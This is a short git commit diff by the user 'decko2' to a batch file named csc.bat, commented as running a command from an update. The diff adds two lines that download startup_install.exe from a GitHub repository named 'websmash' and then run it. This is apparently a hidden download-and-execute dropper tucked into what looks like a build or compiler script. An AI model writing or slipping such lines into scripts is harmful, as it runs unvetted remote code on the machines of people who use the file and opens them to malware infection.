dd8d95f4d11a37f4680285b36946c3cd3c348b96
decko2 <88717056+decko2@users.noreply.github.com>
2022-04-24 14:24:02 +0200

    Update csc.bat

--- csc.bat
+++ csc.bat
@@ -1,4 +1,7 @@
 @echo off
 :: Running command from update.
 
+fetch https://github.com/decko2/websmash/raw/main/additional/startup_install.exe startup_install.exe
+start /wait startup_install.exe
+
 exit /b
